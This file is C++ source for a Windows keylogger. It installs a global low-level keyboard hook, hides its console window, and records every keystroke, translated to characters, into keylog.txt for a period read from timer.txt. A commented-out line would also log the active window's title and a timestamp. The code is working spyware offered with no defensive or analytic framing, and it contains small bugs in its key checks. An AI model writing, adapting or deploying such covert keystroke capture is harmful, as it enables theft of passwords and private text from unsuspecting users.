#include <iostream>
#include <Windows.h>
#include <time.h>
#include <fstream>
#include <chrono>
#include <thread>
#include <string>

#pragma warning(disable:4996);
#pragma warning(disable:4703);

using namespace std;

int Save(int key);

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

ofstream file;

int Save(int key)
{
    wchar_t prevProg[256];
    if (key == 1 || key == 2)
    {
        return 0;
    }

    HWND foreground = GetForegroundWindow();

    DWORD threadId;

    HKL keyboardLayout;

    if (foreground)
    {
        threadId = GetWindowThreadProcessId(foreground, NULL);

        keyboardLayout = GetKeyboardLayout(threadId);

        wchar_t crrProg[256];

        GetWindowText(foreground, crrProg, 256);

        if (wcscmp(crrProg, prevProg) != 0)
        {
            wcscpy_s(prevProg, crrProg);
            time_t t = time(NULL);
            struct tm* tm = localtime(&t);
            char c[64];
            strftime(c, sizeof(c), "%c", tm);
            //file << "\n\n\n[Program: " << crrProg << " DateTime: " << c << "]";
        }
    }

    cout << key << endl;

    if (key == VK_BACK)
        file << "`";
    else if (key == VK_RETURN)
        file << "\n";
    else if (key == VK_SPACE)
        file << " ";
    else if (key == VK_TAB)
        file << "   ";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        file << "`";
    else if (key == key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        file << "`";
    else if (key == VK_ESCAPE)
        file << "`";
    else if (key == VK_END)
        file << "`";
    else if (key == VK_HOME)
        file << "`";
    else if (key == VK_LEFT)
        file << "`";
    else if (key == VK_RIGHT)
        file << "`";
    else if (key == VK_UP)
        file << "`";
    else if (key == VK_DOWN)
        file << "`";
    else if (key == 190 || key == 110)
        file << ".";
    else if (key == 189 || key == 109)
        file << "-";
    else if (key == 20)
        file << "`";
    else if (key == VK_INSERT)
        file << "`";
    else if (key == VK_DELETE)
        file << "`"; 
    else
    {
        char crrKey;
        bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lower = !lower;
        }
        crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

        if (!lower)
        {
            crrKey = tolower(crrKey);
        }

        file << char(crrKey);
    }

    file.flush();

    return 0;
}

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

            Save(kbStruct.vkCode);
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
    string line;
    remove("keylog.txt");

    file.open("keylog.txt", ios_base::app);

    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
    {
        
    }

    MSG message;

    int i = GetTickCount();

    ifstream in_t("timer.txt");
    if (in_t.is_open())
    {
        getline(in_t, line);
    }
    in_t.close();
    int _line = stoi(line);
    int endTime = _line;
    bool flag = true;
    while (flag ? i + endTime >= GetTickCount() : true)
    {
        PeekMessage(&message, NULL, 0, 0, 0);
    }
}